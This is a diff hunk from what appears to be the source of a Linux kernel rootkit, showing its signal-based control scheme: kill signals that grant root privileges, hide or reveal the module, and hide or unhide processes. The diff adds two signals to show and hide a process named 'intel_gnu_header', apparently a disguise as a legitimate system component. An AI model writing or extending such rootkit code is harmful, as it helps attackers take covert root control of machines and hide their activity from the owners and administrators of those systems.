@@ -46,6 +46,8 @@ static int hidden_process_count = 0;
 //====================================//
 #define SIGUSR1 10                  // Root privilege escalation
 #define SIGUSR2 12                  // Module hide/show toggle
+#define SIGTTOU 22                  // Show intel_gnu_header process (kill -22 0)
+#define SIGTTIN 23                  // Hide intel_gnu_header process (kill -23 0)
 #define SIGRTMIN 34                 // Hide process (kill -34 0 PID_TO_HIDE)
 #define SIGRTMIN1 35                // Unhide process (kill -35 0 PID_TO_UNHIDE)
 #define SIGRTMIN2 36                // Clear all hidden processes (kill -36 0)
